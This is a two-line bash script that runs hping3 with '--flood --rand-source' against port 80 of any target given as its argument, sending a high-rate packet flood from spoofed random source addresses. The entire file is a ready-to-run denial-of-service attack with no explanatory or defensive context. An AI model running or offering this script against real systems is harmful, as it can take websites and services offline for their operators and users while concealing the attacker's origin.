#!/bin/bash
hping3 --flood --rand-source -p 80 -d 1460 $1
